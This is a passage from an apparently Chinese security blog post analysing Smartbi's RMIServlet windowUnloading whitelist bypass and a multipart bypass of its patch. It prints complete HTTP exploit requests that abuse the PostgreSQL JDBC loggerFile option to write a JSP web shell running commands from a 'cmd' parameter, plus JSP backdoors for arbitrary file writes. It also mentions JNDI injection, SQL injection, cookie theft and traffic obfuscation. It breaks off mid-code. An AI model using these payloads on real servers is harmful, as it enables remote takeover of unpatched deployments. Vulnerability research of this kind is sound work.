<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829184627616.png" alt="image-20230829184627616"></p>
<p>可以发现，这里最后调用的<code>this.e</code>实际上是一个HashMap的名单，也就是在<code>this.e</code>中，查找上述获取的<code>className</code>是否存在。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829184931083.png" alt="image-20230829184931083"></p>
<p>只要获取到的className存在于<code>this.e</code>中，就可以继续接下来的程序。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829185144923.png" alt="image-20230829185144923"></p>
<p>使用将params以json格式进行解析，随后调用service.execute()方式，这里最后将会通过反射方式调用我们给出的类中的方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829185421065.png" alt="image-20230829185421065"></p>
<h4 id="基于Smartbi中DataSourceService类的JDBC任意文件写入："><a href="#基于Smartbi中DataSourceService类的JDBC任意文件写入：" class="headerlink" title="基于Smartbi中DataSourceService类的JDBC任意文件写入："></a>基于Smartbi中DataSourceService类的JDBC任意文件写入：</h4><p>通过上述分析，我们可以知道，当使用windowUnloading进行绕过之后，我们实际上是可以调用<code>this.e</code>这个<code>hashmap</code>中的任意类的任意方法，同时传递任意参数的。</p>
<p>这里我首先给出可以使用的EXP，随后根据exp来对该漏洞的利用方式进行分析，其中会包含一些坑点，以及问题。</p>
<p>exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1</span><br><span class="line">Host: localhost:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQConfigLogined=; JSESSIONID=9F4B22AFDE785C86FB33687608795655; Phpstorm-4588ec75=9665af70-58e7-4baf-8fce-3fbfb54208c8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2525</span><br><span class="line"></span><br><span class="line">className=DataSourceService&amp;methodName=testConnectionList&amp;params=%5b%5b%7b%22%70%61%73%73%77%6f%72%64%22%3a%22%22%2c%22%6d%61%78%43%6f%6e%6e%65%63%74%69%6f%6e%22%3a%31%30%30%2c%22%75%73%65%72%22%3a%22%22%2c%22%64%72%69%76%65%72%54%79%70%65%22%3a%22%50%4f%53%54%47%52%45%53%51%4c%22%2c%22%76%61%6c%69%64%61%74%69%6f%6e%51%75%65%72%79%22%3a%22%53%45%4c%45%43%54%20%31%22%2c%22%75%72%6c%22%3a%22%6a%64%62%63%3a%70%6f%73%74%67%72%65%73%71%6c%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%35%34%33%32%2f%74%65%73%74%3f%41%70%70%6c%69%63%61%74%69%6f%6e%4e%61%6d%65%3d%78%78%78%75%73%65%72%3d%74%65%73%74%26%70%61%73%73%77%6f%72%64%3d%74%65%73%74%26%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%44%45%42%55%47%26%6c%6f%67%67%65%72%46%69%6c%65%3d%2e%2e%2f%77%65%62%61%70%70%73%2f%73%6d%61%72%74%62%69%2f%76%69%73%69%6f%6e%2f%63%6d%64%73%68%65%6c%6c%2e%6a%73%70%26%3c%25%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%5c%22%7e%7e%7e%5c%22%29%3b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%2e%74%6f%42%79%74%65%41%72%72%61%79%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%63%6d%64%5c%22%29%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%29%3b%25%3e%22%2c%22%6e%61%6d%65%22%3a%22%74%65%73%74%22%2c%22%64%72%69%76%65%72%22%3a%22%6f%72%67%2e%70%6f%73%74%67%72%65%73%71%6c%2e%44%72%69%76%65%72%22%2c%22%69%64%22%3a%22%22%2c%22%64%65%73%63%22%3a%22%22%2c%22%61%6c%69%61%73%22%3a%22%22%2c%22%64%62%43%68%61%72%73%65%74%22%3a%22%22%2c%22%69%64%65%6e%74%69%66%69%65%72%51%75%6f%74%65%53%74%72%69%6e%67%22%3a%22%5c%22%22%2c%22%74%72%61%6e%73%61%63%74%69%6f%6e%49%73%6f%6c%61%74%69%6f%6e%22%3a%2d%31%2c%22%76%61%6c%69%64%61%74%69%6f%6e%51%75%65%72%79%4d%65%74%68%6f%64%22%3a%30%2c%22%64%62%54%6f%43%68%61%72%73%65%74%22%3a%22%22%2c%22%61%75%74%68%65%6e%74%69%63%61%74%69%6f%6e%54%79%70%65%22%3a%22%53%54%41%54%49%43%22%2c%22%64%72%69%76%65%72%43%61%74%61%6c%6f%67%22%3a%6e%75%6c%6c%2c%22%65%78%74%65%6e%64%50%72%6f%70%22%3a%22%7b%5c%22%6d%61%78%57%61%69%74%43%6f%6e%6e%65%63%74%69%6f%6e%54%69%6d%65%5c%22%3a%2d%31%2c%5c%22%61%6c%6c%6f%77%45%78%63%65%6c%49%6d%70%6f%72%74%5c%22%3a%66%61%6c%73%65%2c%5c%22%61%70%70%6c%79%54%6f%53%6d%61%72%74%62%69%78%44%61%74%61%73%65%74%5c%22%3a%66%61%6c%73%65%2c%5c%22%63%61%74%61%6c%6f%67%54%79%70%65%5c%22%3a%5c%22%50%72%6f%64%75%63%74%42%75%69%6c%74%49%6e%5c%22%7d%22%7d%5d%5d</span><br></pre></td></tr></table></figure>

<p>接下来根据exp进行分析：</p>
<p>首先，这里的文件写入，主要是利用的jdbc存在一个可以在url中指定日志文件的特性。</p>
<p>不难看出，我们此时调用的是<code>DataSourceService</code>类中的<code>testConnectionList()</code>方法，同时，将我们传入的参数进行url解码后，可以得到如下结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[&#123;&quot;password&quot;:&quot;&quot;,&quot;maxConnection&quot;:100,&quot;user&quot;:&quot;&quot;,&quot;driverType&quot;:&quot;POSTGRESQL&quot;,&quot;validationQuery&quot;:&quot;SELECT 1&quot;,&quot;url&quot;:&quot;jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&amp;password=test&amp;loggerLevel=DEBUG&amp;loggerFile=../webapps/smartbi/vision/cmdshell.jsp&amp;&lt;%out.println(\&quot;~~~\&quot;);out.println(new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream())));%&gt;&quot;,&quot;name&quot;:&quot;test&quot;,&quot;driver&quot;:&quot;org.postgresql.Driver&quot;,&quot;id&quot;:&quot;&quot;,&quot;desc&quot;:&quot;&quot;,&quot;alias&quot;:&quot;&quot;,&quot;dbCharset&quot;:&quot;&quot;,&quot;identifierQuoteString&quot;:&quot;\&quot;&quot;,&quot;transactionIsolation&quot;:-1,&quot;validationQueryMethod&quot;:0,&quot;dbToCharset&quot;:&quot;&quot;,&quot;authenticationType&quot;:&quot;STATIC&quot;,&quot;driverCatalog&quot;:null,&quot;extendProp&quot;:&quot;&#123;\&quot;maxWaitConnectionTime\&quot;:-1,\&quot;allowExcelImport\&quot;:false,\&quot;applyToSmartbixDataset\&quot;:false,\&quot;catalogType\&quot;:\&quot;ProductBuiltIn\&quot;&#125;&quot;&#125;]]</span><br></pre></td></tr></table></figure>

<p>这里关键的漏洞利用部分就是url对应的参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;url&quot;:&quot;jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&amp;password=test&amp;loggerLevel=DEBUG&amp;loggerFile=../webapps/smartbi/vision/cmdshell.jsp&amp;&lt;%out.println(\&quot;~~~\&quot;);out.println(new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream())));%&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>开始跟一下调用链：</p>
<p>这里找到入口<code>testConnectionList()</code>函数,并给出一个调用栈。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901110449911.png" alt="image-20230901110449911"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901110400994.png" alt="image-20230901110400994"></p>
<p>这里最关键的写文件函数在<code>org.postgresql.Driver.class#connect()</code>中，这里让我们详细分析一下写文件的原理：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901111035014.png" alt="image-20230901111035014"></p>
<p>整个函数中，最关键的函数是这三个</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901111124967.png" alt="image-20230901111124967"></p>
<h4 id="parseURL-函数："><a href="#parseURL-函数：" class="headerlink" title="parseURL()函数："></a>parseURL()函数：</h4><p>该函数会对我们传入的url进行解析，以获取其中的参数。具体的解析参数的逻辑如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901113106858.png" alt="image-20230901113106858"></p>
<p><code>parseURL()</code>函数会以&amp;作为分割，将url中的参数分割为数个字符串。</p>
<p>随后，依次遍历所有被分割出来的字符串，通过<code>pos = token.indexOf(61);</code>检测字符串中是否存在<code>=</code>号。</p>
<p>当存在<code>=</code>，也就是pos不为-1时，就会以<code>=</code>为标识对字符串做分割，将其作为一个键值对，<strong>对值进行url解码</strong>，随后存入对应的变量中。如果没有等号，就将整个字符串作为键，值设为<code>&quot;&quot;</code>。</p>
<p><strong>这里的url解码需要注意一下，会涉及到后面的一个坑点</strong>。</p>
<p>当这段函数循环处理了我们的url之后，可以得到如下的一个数组：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901132818056.png" alt="image-20230901132818056"></p>
<p>此时可以发现，我们指定的日志文件路径和日志文件名，已经被作为loggerFile键对应的值被解析出来了。</p>
<h4 id="this-setupLoggerFromProperties-函数："><a href="#this-setupLoggerFromProperties-函数：" class="headerlink" title="this.setupLoggerFromProperties()函数："></a>this.setupLoggerFromProperties()函数：</h4><p>这个函数用于处理日志文件，跟入其中之后，可以看到它对于我们上述参数的处理</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901134036668.png" alt="image-20230901134036668"></p>
<p>首先在第一个红框中，是在读取loggerLevel，也就是日志文件等级，这里如我们之前设置的一样，是DEBUG，这里不能设置为OFF，否则会失败。</p>
<p>随后在第二个红框中，可以看到它读取了我们设置的文件路径，因为这里没有做任何文件路径的限制，所以可以通过<code>../</code>从当前路径退出，让我们将文件写入到我们想要的地方。</p>
<h4 id="LOGGER-log-函数："><a href="#LOGGER-log-函数：" class="headerlink" title="LOGGER.log()函数："></a>LOGGER.log()函数：</h4><p>这个函数的作用很简单，就是将我们传入的url写入到日志文件中，而这个日志文件，也就是我们之前设定好的路径下的cmdShell.jsp文件。</p>
<p>而这个时候，我们的恶意代码就会作为url的一部分，被嵌入到我们设定好的日志文件中去。</p>
<p>这里让我们看一下本地生成的文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901135354471.png" alt="image-20230901135354471"></p>
<p>可以看到，这里我们成功的在一大串报错中嵌入成功了一段jsp代码，当我们访问这个文件的时候，即可达成jsp代码的执行，而剩余的报错，只会被以文本的方式进行解读。</p>
<p>以此，我们即可实现依托于Runtime类的exec命令执行。</p>
<h3 id="坑点解析：-1"><a href="#坑点解析：-1" class="headerlink" title="坑点解析："></a>坑点解析：</h3><p>虽然我们现在已经可以实现命令执行了，但是只是使用Runtime类进行的最简陋的命令执行效果。</p>
<p>但当我们尝试使用同样的方法进行更复杂的文件写入，例如希望尝试写入一串哥斯拉的jsp马，或是更复杂的命令执行的时候，我们会遇到一些小小的坑点。</p>
<p>这里让我们回过头来看我们写入的代码和parseURL()函数中的url解析逻辑：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901140007267.png" alt="image-20230901140007267"></p>
<p>假设我们想要通过url写入一串同时带有<code>=</code>和<code>%</code>的jsp代码如下：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">ApplicationName=xxxuser=test&amp;hhh=&lt;% <span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>()%&gt;</span><br></pre></td></tr></table></figure>

<p>此时，我们不难发现，根据parseURL()函数的解析规则，这段URL中的参数会被&amp;分割为两个字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ApplicationName ： xxxuser=test</span><br></pre></td></tr></table></figure>

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">hhh ： &lt;% <span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>()%&gt;</span><br></pre></td></tr></table></figure>

<p>随后再对这两个字符串依次进行处理。也就是以等号为分割，将它转换为一个键值对。</p>
<p>此时，对于第二个字符串来说，键名是hhh，而值则是我们构造的jsp代码。</p>
<p>这个时候就出现问题了，在之前提过，当进行值的存储的时候，会将值首先进行依次URL解码。此时，程序就会将<code>&lt;% String</code>这里的<code>%</code>误认为是某个url编码的值的标识符，但是它无法进行解析，于是会抛出错误。</p>
<p>当然，可能会有人希望通过编码的方式来进行绕过，但是这样也是不可行的。</p>
<p>当我们将上述的jsp程序url编码为以下字符串的时候：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3c%25%20%53%74%72%69%6e%67%20%74%65%73%74%20%3d%20%6e%65%77%20%53%74%72%69%6e%67%28%29%25%3e</span><br></pre></td></tr></table></figure>

<p>他确实可以进行绕过，但是当我们访问最后的jsp文件的时候会发现，上述的url编码被原样写入到文件中了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901141650393.png" alt="image-20230901141650393"></p>
<p>也就导致我们无法正确运行程序。</p>
<h3 id="正确利用漏洞的方案：-1"><a href="#正确利用漏洞的方案：-1" class="headerlink" title="正确利用漏洞的方案："></a>正确利用漏洞的方案：</h3><p>因此，这里最好的利用方式，还是创建一个可以写入文件的简单的后门马，随后利用这个后门马，在我们想要的地方写入我们需要的纯净的程序。</p>
<p>例如：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="string">&quot;success&quot;</span>);<span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(request.getParameter(<span class="string">&quot;filename&quot;</span>)).write(request.getParameter(<span class="string">&quot;content&quot;</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure>

<p>又或者是简单的使用命令执行的效果：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="string">&quot;&amp;&amp;&amp;&amp;&quot;</span>);out.println(<span class="keyword">new</span> <span class="title class_">String</span>(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream())));out.println(<span class="string">&quot;&amp;&amp;&amp;&amp;&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-x2F-vision-x2F-RMIServlet-windowUnloading参数，Multipart逻辑漏洞"><a href="#3-x2F-vision-x2F-RMIServlet-windowUnloading参数，Multipart逻辑漏洞" class="headerlink" title="3. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，Multipart逻辑漏洞"></a>3. &#x2F;vision&#x2F;RMIServlet?windowUnloading参数，Multipart逻辑漏洞</h2><h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>这里直接给出EXP：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1</span><br><span class="line">Host: localhost:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</span><br><span class="line">Content-Length: 1189</span><br><span class="line">Content-Type: multipart/form-data;charset=UTF-8;boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;className&quot;</span><br><span class="line"></span><br><span class="line">DataSourceService</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;methodName&quot;</span><br><span class="line"></span><br><span class="line">testConnectionList</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;params&quot;</span><br><span class="line"></span><br><span class="line">[[&#123;&quot;password&quot;:&quot;&quot;,&quot;maxConnection&quot;:100,&quot;user&quot;:&quot;&quot;,&quot;driverType&quot;:&quot;POSTGRESQL&quot;,&quot;validationQuery&quot;:&quot;SELECT 1&quot;,&quot;url&quot;:&quot;jdbc:postgresql://localhost:5432/test?ApplicationName=xxxuser=test&amp;password=test&amp;loggerLevel=DEBUG&amp;loggerFile=../webapps/smartbi/vision/0DFCC1b8f1Db599F.jsp&amp;&lt;%out.println(\&quot;~~~\&quot;);out.println(new String(org.apache.commons.io.IOUtils.toByteArray(java.lang.Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream())));%&gt;&quot;,&quot;name&quot;:&quot;test&quot;,&quot;driver&quot;:&quot;org.postgresql.Driver&quot;,&quot;id&quot;:&quot;&quot;,&quot;desc&quot;:&quot;&quot;,&quot;alias&quot;:&quot;&quot;,&quot;dbCharset&quot;:&quot;&quot;,&quot;identifierQuoteString&quot;:&quot;\&quot;&quot;,&quot;transactionIsolation&quot;:-1,&quot;validationQueryMethod&quot;:0,&quot;dbToCharset&quot;:&quot;&quot;,&quot;authenticationType&quot;:&quot;STATIC&quot;,&quot;driverCatalog&quot;:null,&quot;extendProp&quot;:&quot;&#123;\&quot;maxWaitConnectionTime\&quot;:-1,\&quot;allowExcelImport\&quot;:false,\&quot;applyToSmartbixDataset\&quot;:false,\&quot;catalogType\&quot;:\&quot;ProductBuiltIn\&quot;&#125;&quot;&#125;]]</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br></pre></td></tr></table></figure>

<p>在上面的windowUnloading参数绕过漏洞出现之后，官方随即通过补丁进行了修复：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">patch</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.assertQueryString(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">assertQueryString</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getQueryString();</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isNullOrEmpty(query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading=&amp;&quot;</span>) &amp;&amp; !query.startsWith(<span class="string">&quot;windowUnloading&amp;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">paramClassName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">paramMethodName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">windowUnloadingStr</span> <span class="operator">=</span> query.length() &gt; <span class="string">&quot;windowUnloading&quot;</span>.length() &amp;&amp; query.charAt(<span class="string">&quot;windowUnloading&quot;</span>.length()) == <span class="string">&#x27;=&#x27;</span> ? <span class="string">&quot;windowUnloading=&amp;&quot;</span> : <span class="string">&quot;windowUnloading&amp;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (query.length() &gt; windowUnloadingStr.length()) &#123;</span><br><span class="line">                    content = query.substring(windowUnloadingStr.length());</span><br><span class="line">                    <span class="keyword">if</span> (content.endsWith(<span class="string">&quot;=&quot;</span>)) &#123;</span><br><span class="line">                        content = content.substring(<span class="number">0</span>, content.length() - <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    content = URLDecoder.decode(content, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">urlClassName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">urlMethodName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (content.indexOf(<span class="string">&quot;className=&quot;</span>) == -<span class="number">1</span> &amp;&amp; content.indexOf(<span class="string">&quot;methodName=&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                    String[] decode = RMICoder.decode(content);</span><br><span class="line">                    urlClassName = decode[<span class="number">0</span>];</span><br><span class="line">                    urlMethodName = decode[<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Map&lt;String, String&gt; map = HttpUtil.parseQueryString(content);</span><br><span class="line">                    urlClassName = (String)map.get(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">                    urlMethodName = (String)map.get(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数中，对于上面的windowUnloading绕过的防御方式是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>首先判断，至少通过url中的windowUnloading参数或者是post等请求方式传递了类名和方法名。</p>
<p>随后，判断windowUnloading和post等请求方式中的类名和方法名是否相同，相同返回0，也就表示继续执行dofilter，如果不相同，则返回1，表示程序结束。</p>
<p>其中，paramClassName，paramMethodName两个值是通过<code>request.getParameter()</code>函数获取的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">paramClassName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">paramMethodName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123;</span><br></pre></td></tr></table></figure>

<p>理论上来说，确实可以防住，但是实际上存在问题。</p>
<p>实际上<code>request.getParameter()</code>这个函数，只能够用于获取get，post请求方法发送的值，但是如果我们尝试通过<code>Multipart</code>方式进行传参，则只会获得一个null值。</p>
<p>也就是说，如果我们通过Multipart方式进行传参，会直接无法通过这段if判断。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName))</span><br></pre></td></tr></table></figure>

<p>导致下面的一系列检查直接失效，直接返回代表继续的0。</p>
<p>也就是说，我们现在windowUnloading方式传入的类和方法以及参数，与我们使用Multipart方式传入的类、方法、参数是不一样的。</p>
<p>当绕过了白名单判定后，在解析过程中，就会重新读取我们请求体中给出的参数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901155111336.png" alt="image-20230901155111336"></p>
<p>也就是说，这里我们最后还是可以调用到DataSourceService类，完成日志文件的写入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901155338042.png" alt="image-20230901155338042"></p>
<p>恶意利用方式和之前没有任何区别。</p>
<h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><p>实际上这里应该还有更多的恶意利用方式，根据之前的不同的Smartbi漏洞来看，一般来说主要能够进行利用的就是DataSourceService这个类，以及checkUserVersion这个类。</p>
<p>前者的主要利用方式可以有JNDI注入，可以直接加载一个恶意类，或者是恶意字节码，完成代码级别的命令执行，也可以直接通过我上述的漏洞利用方式，通过写文件来进行getshell，或者，因为在这个类中存在一个sql语句的控制，实际上也可以通过控制这个sql语句来进行sql注入，通过mysql来进行提权。</p>
<p>如果是利用到checkUserVersion这个类，大部分时候是用于对cookie进行窃取，然后达成登录绕过的效果。</p>
<p>在这里的利用中，我一般会通过加密的方式进行，这里是调用的他自身的加密解密类，虽然看起来是让他能够不容易被分析，但是实际上也产生了一定的流量加密的效果。</p>
<p>这里我整理了一下加密函数和解密函数，用于更方便的进行类的调用：</p>
<p><strong>加密函数</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encryption</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] encodeArray = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; encodeArray.length; i++) &#123;</span><br><span class="line">            encodeArray[i] = (<span class="type">byte</span>) i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    